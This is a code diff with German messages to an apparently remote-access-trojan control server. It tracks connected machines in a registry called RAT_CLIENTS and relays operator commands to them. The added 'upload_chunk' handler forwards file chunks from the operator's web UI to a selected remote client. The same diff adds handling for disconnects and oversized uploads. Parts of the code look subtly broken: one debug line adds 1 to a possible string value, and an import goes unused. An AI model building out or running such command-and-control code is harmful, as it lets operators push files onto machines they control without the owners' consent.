@@ -72,10 +72,37 @@ async def websocket_endpoint(websocket: WebSocket):
                 await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Timeout, Verbindung geschlossen."})
                 break
             except Exception as e:
+                import websockets
+                if isinstance(e, WebSocketDisconnect) or getattr(e, "code", None) == 1006:
+                    logging.warning("[Web-UI] Verbindung wurde abgebrochen (Upload/Disconnect).")
+                    await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Verbindung wurde abgebrochen (Upload/Disconnect)."})
+                    break
+                if "too big" in str(e).lower() or "message too big" in str(e).lower():
+                    logging.error("[Web-UI] Upload zu groß oder WebSocket-Frame zu groß.")
+                    await send_to_web_ui({"type": "error", "message": "Upload zu groß oder Verbindung abgebrochen. Bitte kleinere Datei wählen."})
+                    break
                 logging.error(f"[Web-UI] Fehler: {e}")
                 await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Web-UI Fehler: {e}"})
                 break
 
+            # --- Chunked Upload Handling ---
+            if data.get("action") == "upload_chunk":
+                # Weiterleitung an Client wie bei normalem Upload
+                target_id = data.get("target_id")
+                try:
+                    target_id_int = int(target_id)
+                except Exception:
+                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
+                    continue
+                if target_id_int not in RAT_CLIENTS:
+                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
+                    continue
+                target_ws = RAT_CLIENTS[target_id_int]
+                payload = dict(data)
+                payload["client_id"] = str(target_id_int)
+                await target_ws.send_json(payload)
+                await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Chunk {data.get('chunk_index', '?')+1}/{data.get('total_chunks', '?')} an Client {target_id_int} gesendet."})
+                continue
             # --- Client-Liste explizit anfordern ---
             if data.get("action") == "get_clients":
                 await send_client_list()
